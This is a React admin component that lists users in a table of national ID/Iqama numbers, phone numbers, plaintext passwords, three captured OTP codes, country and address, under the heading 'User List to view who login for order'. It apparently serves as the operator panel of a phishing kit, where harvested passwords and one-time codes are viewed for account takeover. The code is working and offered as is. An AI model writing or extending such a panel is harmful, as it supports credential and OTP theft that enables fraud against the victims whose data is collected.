import * as React from 'react';
import Paper from '@mui/material/Paper';
import Table from '@mui/material/Table';
import TableBody from '@mui/material/TableBody';
import TableCell from '@mui/material/TableCell';
import TableContainer from '@mui/material/TableContainer';
import TableHead from '@mui/material/TableHead';
import TablePagination from '@mui/material/TablePagination';
import TableRow from '@mui/material/TableRow';
import { useEffect } from 'react';
import { getUserInfo } from '../../../store/adminSlice';
import { useDispatch, useSelector } from 'react-redux';
import "../user.css";

function createData(nid, phoneNumber, password, otp1, otp2, otp3, country, address) {
    return { nid, phoneNumber, password, otp1, otp2, otp3, country, address };
}

export default function UserInfo() {
    const dispatch = useDispatch();
    const [page, setPage] = React.useState(0);
    const [rowsPerPage, setRowsPerPage] = React.useState(10);
    const { users, isLoading } = useSelector(state => state.admin);




    const handleChangePage = (event, newPage) => {
        setPage(newPage);
    };

    const handleChangeRowsPerPage = (event) => {
        setRowsPerPage(+event.target.value);
        setPage(0);
    };

    useEffect(() => {
        dispatch(getUserInfo());
    }, [dispatch])

    if (isLoading) {
        return <h1 className="text-center text-3xl font-bold py-10"> Loading... </h1>
    }

    const columns = [
        { id: 'nid', label: 'Id/ Iqama Number', maxHeight: 100 },
        { id: 'phoneNumber', label: 'Phone Number', maxHeight: 100 },
        { id: 'password', label: 'Password', maxHeight: 100 },
        { id: 'otp1', label: 'OTP1', maxHeight: 100 },
        { id: 'otp2', label: 'OTP2', maxHeight: 100 },
        { id: 'otp3', label: 'OTP3', maxHeight: 100 },
        { id: 'country', label: 'Country', maxHeight: 100 },
        { id: 'address', label: 'Address', maxHeight: 100 },
    ];

    const rows = users.map((user) => (createData(`${user.nid}`, `${user.phoneNumber}`, `${user.password}`, `${user.otp[0]?.otp}`, `${user.otp[1]?.otp}`, `${user.otp[2]?.otp}`, `${user.nationality}`, `${user.address}`)))

    return (
        <section className="userTableBox">
            <h1 className="text-center text-xl font-semibold py-3 my-5 border "> User List to view who login for order </h1>

            <Paper sx={{ width: '100%', overflow: 'hidden' }}>
                <TableContainer sx={{ maxHeight: 440 }}>
                    <Table stickyHeader aria-label="sticky table">
                        <TableHead>
                            <TableRow>
                                {columns.map((column) => (
                                    <TableCell
                                        key={column.id}
                                        align={column.align}
                                        style={{ minWidth: column.minWidth }}
                                    >
                                        {column.label}
                                    </TableCell>
                                ))}
                            </TableRow>
                        </TableHead>
                        <TableBody>
                            {rows
                                .slice(page * rowsPerPage, page * rowsPerPage + rowsPerPage)
                                .map((row) => {
                                    return (
                                        <TableRow hover role="checkbox" tabIndex={-1} key={row.code}>
                                            {columns.map((column) => {
                                                const value = row[column.id];
                                                return (
                                                    <TableCell key={column.id} align={column.align}>
                                                        {column.format && typeof value === 'number'
                                                            ? column.format(value)
                                                            : value}
                                                    </TableCell>
                                                );
                                            })}
                                        </TableRow>
                                    );
                                })}
                        </TableBody>
                    </Table>
                </TableContainer>
                <TablePagination
                    rowsPerPageOptions={[10, 25, 100]}
                    component="div"
                    count={rows.length}
                    rowsPerPage={rowsPerPage}
                    page={page}
                    onPageChange={handleChangePage}
                    onRowsPerPageChange={handleChangeRowsPerPage}
                />
            </Paper>
        </section>
    );
}